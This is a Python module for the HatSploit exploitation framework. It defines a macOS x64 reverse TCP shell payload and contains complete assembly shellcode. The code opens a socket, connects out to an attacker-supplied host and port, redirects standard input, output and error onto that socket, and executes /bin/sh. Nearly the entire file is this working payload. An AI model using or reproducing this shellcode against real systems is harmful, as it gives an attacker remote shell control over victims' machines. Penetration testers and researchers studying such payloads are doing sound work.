"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.payload.basic import *
from hatsploit.lib.core.payload.macos import MacOS


class HatSploitPayload(Payload, Handler, MacOS):
    def __init__(self):
        super().__init__({
            'Name': "macOS x64 Shell Reverse TCP",
            'Payload': "macos/x64/shell_reverse_tcp",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - payload developer',
            ],
            'Description': "Shell reverse TCP payload for macOS x64.",
            'Arch': ARCH_X64,
            'Platform': OS_MACOS,
            'Type': REVERSE_TCP,
        })

    def implant(self):
        return self.assemble(
            """
            start:
                xor rsi, rsi
                mov sil, 0x3

            dup:
                mov rax, r8
                mov al, 0x5a
                sub sil, 1
                syscall

                test rsi, rsi
                jne dup

                push rsi
                mov rdi, 0x68732f6e69622f2f
                push rdi
                push rsp
                pop rdi
                xor rdx, rdx
                mov rax, r8
                mov al, 0x3b
                syscall
            """
        )

    def run(self):
        return self.assemble(
            f"""
            start:
                xor rdi, rdi
                mul rdi
                mov dil, 0x2
                xor rsi, rsi
                mov sil, 0x1
                mov al, 0x2
                ror rax, 0x28
                mov r8, rax
                mov al, 0x61
                syscall

                mov rsi, 0x{self.rhost.little.hex()}{self.rport.little.hex()}020f
                push rsi
                push rsp
                pop rsi
                mov rdi, rax
                xor dl, 0x10
                mov rax, r8
                mov al, 0x62
                syscall
            """
        ) + self.implant()
